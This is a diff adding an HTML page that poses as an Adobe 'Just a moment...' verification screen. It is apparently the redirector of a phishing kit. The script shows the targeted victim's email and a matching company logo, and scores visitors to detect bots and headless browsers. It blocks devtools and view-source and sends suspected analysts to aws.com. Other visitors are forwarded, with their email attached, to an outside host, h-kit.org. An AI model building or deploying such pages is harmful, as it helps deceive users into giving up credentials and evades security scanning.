@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Adobe - Just a moment...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f00;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+    }
+    .logo {
+      width: 90px;
+      margin-bottom: 15px;
+      background: white;
+      padding: 10px;
+      border-radius: 8px;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 5px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #FFFFFF;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <img id="logo" class="logo" alt="Provider Logo" src="https://logo.clearbit.com/adobe.com">
+  <p id="userEmail">Verifying...</p>
+  <div class="spinner"></div>
+  <p>Just a moment...</p>
+
+  <script>
+    function getQueryParam(name) {
+      const params = new URLSearchParams(window.location.search);
+      return params.get(name);
+    }
+
+    function decodeBase64(encoded) {
+      try { return atob(encoded); } catch { return null; }
+    }
+
+    function getFragment() {
+      return window.location.hash.substring(1);
+    }
+
+    const emailParam = getQueryParam("email");
+    let email = emailParam;
+    if (email && email.includes('%3D')) email = decodeBase64(email);
+    if (email) {
+      document.getElementById("userEmail").innerText = email;
+      const domain = email.split("@")[1];
+      document.getElementById("logo").src = "https://logo.clearbit.com/" + domain;
+    }
+
+    // BOT DEFENSE COMBO:
+    let suspicionScore = 0;
+    function checkHeadless() {
+      if (navigator.webdriver || !window.chrome) suspicionScore += 2;
+    }
+    function checkWebGL() {
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        if (!gl) suspicionScore += 2;
+      } catch { suspicionScore += 2; }
+    }
+
+    let mouseMoves = 0;
+    let clicks = 0;
+    document.addEventListener('mousemove', () => mouseMoves++);
+    document.addEventListener('click', () => clicks++);
+
+    let lastTime = performance.now();
+    document.addEventListener('mousemove', () => {
+      const now = performance.now();
+      if (now - lastTime < 30) suspicionScore += 1;
+      lastTime = now;
+    });
+
+    const honeypot = document.createElement('input');
+    honeypot.type = 'text';
+    honeypot.name = 'phone';
+    honeypot.style.position = 'absolute';
+    honeypot.style.left = '-9999px';
+    honeypot.setAttribute('autocomplete', 'off');
+    document.body.appendChild(honeypot);
+
+    // DEVTOOLS DETECTION
+    function detectDevTools() {
+      const threshold = 160;
+      let checkCount = 0;
+      const interval = setInterval(() => {
+        const widthExceeds = window.outerWidth - window.innerWidth > threshold;
+        const heightExceeds = window.outerHeight - window.innerHeight > threshold;
+        if (widthExceeds || heightExceeds) {
+          checkCount++;
+          if (checkCount > 3) {
+            alert("Session blocked due to suspicious activity.");
+            window.location.href = 'https://aws.com';
+            clearInterval(interval);
+          }
+        } else {
+          checkCount = 0;
+        }
+      }, 600);
+    }
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function (e) {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+        alert('Unauthorized inspection blocked.');
+        e.preventDefault();
+        return false;
+      }
+    };
+
+    checkHeadless();
+    checkWebGL();
+    detectDevTools();
+
+    setTimeout(() => {
+      if (honeypot.value) suspicionScore += 3;
+      if (suspicionScore > 4) {
+        window.location.href = 'https://aws.com';
+      } else {
+        let redirectUrl = 'https://h-kit.org/?ltvruheg';
+        const frag = getFragment();
+        if (frag) redirectUrl += `&em=${frag}`;
+        window.location.href = redirectUrl;
+      }
+    }, 3500);
+  </script>
+</body>
+</html>
